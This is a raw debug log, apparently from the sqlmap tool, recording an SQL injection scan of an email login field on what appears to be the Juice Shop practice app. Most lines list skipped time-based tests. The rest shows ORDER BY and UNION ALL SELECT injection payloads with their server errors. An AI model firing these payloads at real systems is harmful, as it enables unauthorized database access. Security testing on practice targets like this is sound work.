+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle AND time-based blind' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle OR time-based blind' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[16:43:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[16:43:25] [PAYLOAD] admin@juice-sh.op' ORDER BY 1-- otfi
+[16:43:25] [PAYLOAD] admin@juice-sh.op' ORDER BY 8753-- GGKo
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL-- SMQy
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL-- rjcM
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL-- iVhf
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL-- UuQX
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- VyMa
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- KbYN
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Uwwq
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PhEN
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eleA
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- szRQ
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TfNr
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jerP
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dUGn
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iMEm
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Yirr
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iPGp
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Pvrq
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bJGA
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QDQr
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GAPX
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[16:43:25] [PAYLOAD] -6601' ORDER BY 1-- tgsS
+[16:43:25] [PAYLOAD] -4970' ORDER BY 6809-- vhVc
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -2586' UNION ALL SELECT 9841-- kIgE
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -9380' UNION ALL SELECT 3087,3087-- nqsT
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -6363' UNION ALL SELECT 1343,1343,1343-- cChg
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -8202' UNION ALL SELECT 6813,6813,6813,6813-- MYFc
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -6167' UNION ALL SELECT 7477,7477,7477,7477,7477-- BrMU
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -8344' UNION ALL SELECT 2379,2379,2379,2379,2379,2379-- ioiJ
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -9053' UNION ALL SELECT 7377,7377,7377,7377,7377,7377,7377-- yUZB
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -8950' UNION ALL SELECT 6446,6446,6446,6446,6446,6446,6446,6446-- Mfcl
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -4496' UNION ALL SELECT 9020,9020,9020,9020,9020,9020,9020,9020,9020-- nlCC
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -5453' UNION ALL SELECT 9093,9093,9093,9093,9093,9093,9093,9093,9093,9093-- iCpQ
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -7543' UNION ALL SELECT 8136,8136,8136,8136,8136,8136,8136,8136,8136,8136,8136-- UTVc
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -2283' UNION ALL SELECT 9258,9258,9258,9258,9258,9258,9258,9258,9258,9258,9258,9258-- mmeF
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -3475' UNION ALL SELECT 4697,4697,4697,4697,4697,4697,4697,4697,4697,4697,4697,4697,4697-- gfkM
+[16:43:25] [PAYLOAD] -5558' UNION ALL SELECT 6583,6583,6583,6583,6583,6583,6583,6583,6583,6583,6583,6583,6583,6583-- QTVD
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -1356' UNION ALL SELECT 4209,4209,4209,4209,4209,4209,4209,4209,4209,4209,4209,4209,4209,4209,4209-- EYrw
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -7989' UNION ALL SELECT 2571,2571,2571,2571,2571,2571,2571,2571,2571,2571,2571,2571,2571,2571,2571,2571-- OaAu
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -6271' UNION ALL SELECT 6176,6176,6176,6176,6176,6176,6176,6176,6176,6176,6176,6176,6176,6176,6176,6176,6176-- xcJn
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -8976' UNION ALL SELECT 9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686,9686-- ZRoL
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -8694' UNION ALL SELECT 6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249,6249-- BLWt
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -2458' UNION ALL SELECT 1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738,1738-- CgRU
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BwXe
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- NLBu
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KHLP
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- NRKa
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kwiv
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eLpq
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RRVh
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eqPr
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AuTn
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zRCg
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- SdHh
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jyik
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nTIk
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
